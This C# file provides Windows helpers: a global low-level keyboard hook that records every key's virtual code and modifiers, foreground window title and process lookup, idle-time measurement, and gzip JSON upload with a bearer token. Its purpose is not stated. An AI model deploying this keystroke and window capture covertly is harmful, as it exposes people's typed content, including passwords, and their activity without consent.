using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace CatchMeLite
{
    public sealed class KeyboardEvent
    {
        public int VirtualKey { get; set; }
        public bool KeyDown { get; set; }
        public bool Ctrl { get; set; }
        public bool Alt { get; set; }
        public bool Shift { get; set; }
        public bool Win { get; set; }
        public long TimestampMilliseconds { get; set; }
    }

    public sealed class ActiveWindowInfo
    {
        public IntPtr Handle { get; set; }
        public int ProcessId { get; set; }
        public string ProcessName { get; set; }
        public string Title { get; set; }
    }

    public static class WindowsRuntime
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;
        private const int VK_SHIFT = 0x10;
        private const int VK_CONTROL = 0x11;
        private const int VK_MENU = 0x12;
        private const int VK_LWIN = 0x5B;
        private const int VK_RWIN = 0x5C;

        private static readonly ConcurrentQueue<KeyboardEvent> KeyboardEvents =
            new ConcurrentQueue<KeyboardEvent>();
        private static readonly LowLevelKeyboardProc HookCallback = KeyboardHookCallback;
        private static IntPtr _keyboardHook = IntPtr.Zero;

        [StructLayout(LayoutKind.Sequential)]
        private struct KbdLlHookStruct
        {
            public uint VirtualKeyCode;
            public uint ScanCode;
            public uint Flags;
            public uint Time;
            public UIntPtr ExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LastInputInfo
        {
            public uint Size;
            public uint Time;
        }

        private delegate IntPtr LowLevelKeyboardProc(int code, IntPtr message, IntPtr data);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(
            int hookId,
            LowLevelKeyboardProc callback,
            IntPtr module,
            uint threadId);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(
            IntPtr hook,
            int code,
            IntPtr message,
            IntPtr data);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr GetModuleHandle(string moduleName);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int virtualKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetWindowText(IntPtr window, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr window, out uint processId);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetLastInputInfo(ref LastInputInfo info);

        public static void StartKeyboardHook()
        {
            if (_keyboardHook != IntPtr.Zero)
            {
                return;
            }

            using (Process process = Process.GetCurrentProcess())
            using (ProcessModule module = process.MainModule)
            {
                IntPtr moduleHandle = GetModuleHandle(module.ModuleName);
                _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, moduleHandle, 0);
            }

            if (_keyboardHook == IntPtr.Zero)
            {
                throw new InvalidOperationException(
                    "Unable to install the Windows keyboard timing hook. Error "
                    + Marshal.GetLastWin32Error());
            }
        }

        public static void StopKeyboardHook()
        {
            if (_keyboardHook == IntPtr.Zero)
            {
                return;
            }
            UnhookWindowsHookEx(_keyboardHook);
            _keyboardHook = IntPtr.Zero;
        }

        public static bool TryDequeueKeyboardEvent(out KeyboardEvent value)
        {
            return KeyboardEvents.TryDequeue(out value);
        }

        public static ActiveWindowInfo GetActiveWindow()
        {
            IntPtr handle = GetForegroundWindow();
            uint processId;
            GetWindowThreadProcessId(handle, out processId);
            StringBuilder title = new StringBuilder(2048);
            GetWindowText(handle, title, title.Capacity);

            string processName = string.Empty;
            try
            {
                if (processId != 0)
                {
                    processName = Process.GetProcessById((int)processId).ProcessName;
                }
            }
            catch
            {
                processName = string.Empty;
            }

            return new ActiveWindowInfo
            {
                Handle = handle,
                ProcessId = (int)processId,
                ProcessName = processName ?? string.Empty,
                Title = title.ToString()
            };
        }

        public static double GetIdleSeconds()
        {
            LastInputInfo info = new LastInputInfo();
            info.Size = (uint)Marshal.SizeOf(typeof(LastInputInfo));
            if (!GetLastInputInfo(ref info))
            {
                return 0;
            }
            uint now = unchecked((uint)Environment.TickCount);
            return unchecked(now - info.Time) / 1000.0;
        }

        public static string PostGzipJson(string url, string bearerToken, string json, int timeoutMs)
        {
            byte[] plain = Encoding.UTF8.GetBytes(json);
            byte[] compressed;
            using (MemoryStream output = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(output, CompressionMode.Compress, true))
                {
                    gzip.Write(plain, 0, plain.Length);
                }
                compressed = output.ToArray();
            }
            return Post(url, bearerToken, compressed, "application/json", "gzip", timeoutMs);
        }

        public static string PostJson(string url, string bearerToken, string json, int timeoutMs)
        {
            byte[] body = Encoding.UTF8.GetBytes(json);
            return Post(url, bearerToken, body, "application/json", null, timeoutMs);
        }

        private static string Post(
            string url,
            string bearerToken,
            byte[] body,
            string contentType,
            string contentEncoding,
            int timeoutMs)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = contentType;
            request.Timeout = timeoutMs;
            request.ReadWriteTimeout = timeoutMs;
            request.ContentLength = body.Length;
            request.Headers[HttpRequestHeader.Authorization] = "Bearer " + bearerToken;
            if (!string.IsNullOrEmpty(contentEncoding))
            {
                request.Headers[HttpRequestHeader.ContentEncoding] = contentEncoding;
            }
            using (Stream stream = request.GetRequestStream())
            {
                stream.Write(body, 0, body.Length);
            }
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8))
            {
                return reader.ReadToEnd();
            }
        }

        private static IntPtr KeyboardHookCallback(int code, IntPtr message, IntPtr data)
        {
            if (code >= 0)
            {
                int value = message.ToInt32();
                bool keyDown = value == WM_KEYDOWN || value == WM_SYSKEYDOWN;
                bool keyUp = value == WM_KEYUP || value == WM_SYSKEYUP;
                if (keyDown || keyUp)
                {
                    KbdLlHookStruct details =
                        (KbdLlHookStruct)Marshal.PtrToStructure(data, typeof(KbdLlHookStruct));
                    KeyboardEvents.Enqueue(new KeyboardEvent
                    {
                        VirtualKey = (int)details.VirtualKeyCode,
                        KeyDown = keyDown,
                        Ctrl = IsPressed(VK_CONTROL),
                        Alt = IsPressed(VK_MENU),
                        Shift = IsPressed(VK_SHIFT),
                        Win = IsPressed(VK_LWIN) || IsPressed(VK_RWIN),
                        TimestampMilliseconds = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
                    });
                }
            }
            return CallNextHookEx(_keyboardHook, code, message, data);
        }

        private static bool IsPressed(int virtualKey)
        {
            return (GetAsyncKeyState(virtualKey) & 0x8000) != 0;
        }
    }
}
